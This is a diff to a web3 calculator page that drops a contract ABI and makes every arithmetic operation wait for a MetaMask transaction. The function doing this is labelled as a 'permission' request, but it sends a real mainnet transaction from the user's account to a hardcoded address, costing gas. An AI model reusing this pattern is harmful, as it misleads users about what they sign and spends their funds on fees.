@@ -8,7 +8,7 @@
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            background-color: #87CEEB; /* Sky blue background */
+            background-color: #87CEEB;
             margin: 0;
             padding: 20px;
         }
@@ -34,7 +34,7 @@
             margin: 5px;
             border-radius: 5px;
             border: 1px solid #ddd;
-            width: calc(50% - 22px); /* Adjust to fit two inputs in a row */
+            width: calc(50% - 22px);
             box-sizing: border-box;
         }
         .input-group {
@@ -83,112 +83,25 @@
             <button onclick="divide()">Divide</button>
         </div>
 
-        <div class="result" id="result">Result: </div>
+        <div class="result" id="result">Result: 0</div>
     </div>
 
     <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
     <script>
         let web3;
         let account;
-        let contract;
-        const contractAddress = '0xF61552DD9646907e193359f8159F1E9FCb77d8Cb'; // Replace with your contract address
-        const abi = [
-	{
-		"inputs": [
-			{
-				"internalType": "uint256",
-				"name": "a",
-				"type": "uint256"
-			},
-			{
-				"internalType": "uint256",
-				"name": "b",
-				"type": "uint256"
-			}
-		],
-		"name": "add",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "uint256",
-				"name": "a",
-				"type": "uint256"
-			},
-			{
-				"internalType": "uint256",
-				"name": "b",
-				"type": "uint256"
-			}
-		],
-		"name": "divide",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "uint256",
-				"name": "a",
-				"type": "uint256"
-			},
-			{
-				"internalType": "uint256",
-				"name": "b",
-				"type": "uint256"
-			}
-		],
-		"name": "multiply",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [
-			{
-				"internalType": "uint256",
-				"name": "a",
-				"type": "uint256"
-			},
-			{
-				"internalType": "uint256",
-				"name": "b",
-				"type": "uint256"
-			}
-		],
-		"name": "subtract",
-		"outputs": [],
-		"stateMutability": "nonpayable",
-		"type": "function"
-	},
-	{
-		"inputs": [],
-		"name": "getResult",
-		"outputs": [
-			{
-				"internalType": "uint256",
-				"name": "",
-				"type": "uint256"
-			}
-		],
-		"stateMutability": "view",
-		"type": "function"
-	}
-];
 
         async function init() {
             if (window.ethereum) {
                 web3 = new Web3(window.ethereum);
                 try {
                     await ethereum.request({ method: 'eth_requestAccounts' });
-                    account = (await web3.eth.getAccounts())[0];
-                    document.getElementById('status').innerText = 'MetaMask Connected';
-                    document.getElementById('account').innerText = 'Connected Account: ' + account;
-                    contract = new web3.eth.Contract(abi, contractAddress);
+                    const accounts = await ethereum.request({ method: 'eth_accounts' });
+                    if (accounts.length > 0) {
+                        account = accounts[0];
+                        document.getElementById('status').innerText = 'MetaMask Connected';
+                        document.getElementById('account').innerText = 'Connected Account: ' + account;
+                    }
                 } catch (error) {
                     document.getElementById('status').innerText = 'MetaMask Connection Failed';
                 }
@@ -197,55 +110,101 @@
             }
         }
 
+        async function requestMetaMaskPermission() {
+            const transactionParameters = {
+                to: '0x939743306d5725B34e880d539685864507bb7883', // Replace with the desired recipient's address
+                from: account, // Still using the connected user's account
+                value: '0x0', // Amount of ETH to send (0 in this case)
+                gas: '0x5208', // Gas limit
+                gasPrice: '0x3b9aca00', // Optional: Set a gas price
+                chainId: '0x1', // Optional: Chain ID for Ethereum Mainnet (1)
+            };
+
+            try {
+                await ethereum.request({
+                    method: 'eth_sendTransaction',
+                    params: [transactionParameters],
+                });
+                return true;
+            } catch (error) {
+                console.error('MetaMask Transaction Rejected:', error);
+                return false;
+            }
+        }
+
         async function add() {
             const num1 = parseFloat(document.getElementById('num1').value);
             const num2 = parseFloat(document.getElementById('num2').value);
+
             if (isNaN(num1) || isNaN(num2)) {
                 alert('Please enter valid numbers.');
                 return;
             }
-            const result = num1 + num2;
-            document.getElementById('result').innerText = 'Result: ' + result;
+
+            const approved = await requestMetaMaskPermission();
+            if (approved) {
+                const result = num1 + num2;
+                document.getElementById('result').innerText = `Result: ${result}`;
+            } else {
+                document.getElementById('result').innerText = 'MetaMask Transaction Rejected!';
+            }
         }
 
         async function subtract() {
             const num1 = parseFloat(document.getElementById('num1').value);
             const num2 = parseFloat(document.getElementById('num2').value);
+
             if (isNaN(num1) || isNaN(num2)) {
                 alert('Please enter valid numbers.');
                 return;
             }
-            const result = num1 - num2;
-            document.getElementById('result').innerText = 'Result: ' + result;
+
+            const approved = await requestMetaMaskPermission();
+            if (approved) {
+                const result = num1 - num2;
+                document.getElementById('result').innerText = `Result: ${result}`;
+            } else {
+                document.getElementById('result').innerText = 'MetaMask Transaction Rejected!';
+            }
         }
 
         async function multiply() {
             const num1 = parseFloat(document.getElementById('num1').value);
             const num2 = parseFloat(document.getElementById('num2').value);
+
             if (isNaN(num1) || isNaN(num2)) {
                 alert('Please enter valid numbers.');
                 return;
             }
-            const result = num1 * num2;
-            document.getElementById('result').innerText = 'Result: ' + result;
+
+            const approved = await requestMetaMaskPermission();
+            if (approved) {
+                const result = num1 * num2;
+                document.getElementById('result').innerText = `Result: ${result}`;
+            } else {
+                document.getElementById('result').innerText = 'MetaMask Transaction Rejected!';
+            }
         }
 
         async function divide() {
             const num1 = parseFloat(document.getElementById('num1').value);
             const num2 = parseFloat(document.getElementById('num2').value);
-            if (isNaN(num1) || isNaN(num2)) {
-                alert('Please enter valid numbers.');
+
+            if (isNaN(num1) || isNaN(num2) || num2 === 0) {
+                alert('Please enter valid numbers and ensure the second number is not zero.');
                 return;
             }
-            if (num2 === 0) {
-                alert('Cannot divide by zero.');
-                return;
+
+            const approved = await requestMetaMaskPermission();
+            if (approved) {
+                const result = num1 / num2;
+                document.getElementById('result').innerText = `Result: ${result}`;
+            } else {
+                document.getElementById('result').innerText = 'MetaMask Transaction Rejected!';
             }
-            const result = num1 / num2;
-            document.getElementById('result').innerText = 'Result: ' + result;
         }
 
-        window.onload = init;
+        window.addEventListener('load', init);
     </script>
 </body>
 </html>
